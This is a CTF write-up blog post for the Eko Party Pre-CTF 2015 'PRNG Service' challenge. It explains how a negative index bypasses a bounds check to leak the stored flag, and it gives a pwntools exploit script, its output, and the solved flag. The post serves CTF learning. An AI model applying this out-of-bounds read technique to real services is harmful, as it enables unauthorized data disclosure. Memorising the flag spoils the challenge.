---
layout: post
title: "Eko Party Pre-CTF 2015 PRNG Service"
date: 2015-09-20 23:39:32 -0400
author: [superkojiman]
comments: true
categories: [ekoparty]
---

### Solved by superkojiman

Connect to the service and it generates 64 random numbers. If we look at the source code provided, the flag is stored at rnd[0]:

```c
strcpy((char *)&rnd[0], ANSWER); # our flag is stored on answer.h
srandom(1337);
```

Notice that srandom uses a hardcoded seed, so we can predict the pseudorandom values. We need to extract the flag using the following:

```c
printf ("Your number is: 0x%08x\n", rnd[base + i]);
```

Note however:

```c
signed int i;
unsigned int base, try, rnd[128];
```

rnd and base are unsigned. So we can provide negative values. That means providing -64 gets us rnd[0]. 

```
# nc challs.ctf.site 20003
Welcome to PRNG service
Please wait while we generate 64 random numbers...
Process finished
Choose a number [0-63]?-64
Your number is: 0x7b4f4b45
```

What's 0x7b4f4b45? 

```
# python -c 'from pwn import *; print p32(0x7b4f4b45)'
EKO{
```

That's the start of our flag. Exploit time:

```python
#!/usr/bin/env python
from pwn import *
import time

r = remote("challs.ctf.site", 20003)
flag = ""
n = -64
i = 0
print r.recv()

while i < 10:
    r.send(str(n))
    d = r.recv()
    a = d.split('\n')[0].split(':')

    if len(a) > 1:
        flag += p32(int(a[1], 16))

    n += 1
    i += 1

print "flag:", flag
```

Let's see it in action:

```
# ./sploit.py 
[+] Opening connection to challs.ctf.site on port 20003: Done
Welcome to PRNG service
Please wait while we generate 64 random numbers...

flag: EKO{little_endian_and_signed_-1nt}\x00\xb7
[*] Closed connection to challs.ctf.site port 20003
```

The flag is *** EKO{little_endian_and_signed_-1nt}***
